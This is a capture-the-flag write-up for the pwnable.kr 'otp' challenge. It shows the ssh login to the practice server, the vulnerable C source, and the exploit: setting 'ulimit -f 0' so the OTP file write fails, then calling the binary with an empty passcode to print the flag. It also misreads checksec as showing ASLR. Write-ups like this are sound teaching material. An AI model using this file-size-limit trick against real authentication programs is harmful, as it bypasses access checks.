I made a skeleton interface for one time password authentication system.
I guess there are no mistakes.
could you take a look at it?

hint : not a race condition. do not bruteforce.

ssh otp@pwnable.kr -p2222 (pw:guest)

```console
 ssh otp@pwnable.kr -p2222 
otp@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@gatech.edu
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Sat Sep 25 14:56:52 2021 from 109.186.221.170
otp@pwnable:~$ ls
flag  otp  otp.c
otp@pwnable:~$ 
```

Stage 1: What am I working with?
```console
otp@pwnable:~$ checksec --file ./otp
[*] '/home/otp/otp'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
otp@pwnable:~$ 
```

So it has aslr,canary and NX protection:
https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx

Lets review the code 

```cpp

include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
        char fname[128];
        unsigned long long otp[2];

        if(argc!=2){
                printf("usage : ./otp [passcode]\n");
                return 0;
        }

        int fd = open("/dev/urandom", O_RDONLY); // saves to here 
        if(fd==-1) exit(-1);

        if(read(fd, otp, 16)!=16) exit(-1); //takes 16 bytes data 
        close(fd);

        sprintf(fname, "/tmp/%llu", otp[0]); //value is stored here 
        FILE* fp = fopen(fname, "w");
        if(fp==NULL){ exit(-1); }
        fwrite(&otp[1], 8, 1, fp);  //stores upper 8 bytes to file. 
        fclose(fp);

        printf("OTP generated.\n");

        unsigned long long passcode=0;
        FILE* fp2 = fopen(fname, "r");
        if(fp2==NULL){ exit(-1); }
        fread(&passcode, 8, 1, fp2);
        fclose(fp2);

        if(strtoul(argv[1], 0, 16) == passcode){ //if random val match user input AUTH
                printf("Congratz!\n");
                system("/bin/cat flag");
        }
        else{
                printf("OTP mismatch\n");
        }

        unlink(fname);
        return 0;
}

```

Approach 

The code creats a random value to /tmp/ this is done with fwrite() 

A quick and simple way for this is to use 
ulimit:https://ss64.com/bash/ulimit.html 

So we just go 

ulimit -f 0 sets the file to 0 so nothing will be written to it. 

Now we use python subprocsess this is to view output with Popen 
https://docs.python.org/3/library/subprocess.html

if this is not used and we run the file without subprocsess we will get the follwowing:
```console
otp@pwnable:~$ ./otp ""
File size limit exceeded (core dumped)
otp@pwnable:~$ 
```



```console
otp@pwnable:~$ python 
Python 2.7.12 (default, Mar  1 2021, 11:38:31) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import subprocess as S
>>> S.Popen(["./otp" , "" ])
<subprocess.Popen object at 0x7f67f2bb4ed0>
>>> OTP generated.
Congratz!
Darn... I always forget to check the return value of fclose() :(
>>> 

```


